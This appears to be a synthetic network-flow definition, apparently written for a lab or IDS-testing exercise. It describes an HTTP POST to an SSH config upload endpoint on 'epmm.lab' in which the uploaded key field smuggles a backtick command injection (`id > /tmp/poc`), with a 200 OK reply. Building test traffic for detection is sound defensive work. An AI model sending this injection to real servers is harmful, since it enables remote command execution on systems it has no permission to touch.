flow httpflow -> {
  ip client 192.168.1.100
  ip server 192.168.1.1
  port client 32245
  port server 62079
  mac client 00:0a:95:9d:68:16
  mac server 00:0c:29:8d:3c:71
  protocol tcp
  handshake
  data client {
    string "POST /api/ssh/config/upload HTTP/1.1\r\n"
    string "Host: epmm.lab\r\n"
    string "Cookie: JSESSIONID=D18BEF4B5F817FB983A7F124F9F7448D\r\n"
    string "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjQvABOWXMtaJyvs3\r\n"
    string "\r\n"
    string "------WebKitFormBoundaryjQvABOWXMtaJyvs3\r\n"
    string "Content-Disposition: form-data; name=\"fieldId1\"; filename=\"test.key\"\r\n"
    string "Content-Type: application/vnd.apple.keynote\r\n"
    string "\r\n"
    string "ssh-ed25519\r\n"
    string "AAAAC3NzaC11ZDI1NTE5AAAAIEq36WqQBsNt41XzSaxL5ksZfmUqwY3UwmdS2Vj7Ni41 `id > /tmp/poc`\r\n"
    string "Student Name: Muhammad Zafar\r\n"
    string "------WebKitFormBoundaryjQvABOWXMtaJyvs3--\r\n"
  }
  data server {
    string "HTTP/1.1 200 OK\r\n"
    string "Content-Length: 0\r\n"
    string "\r\n"
  }
}
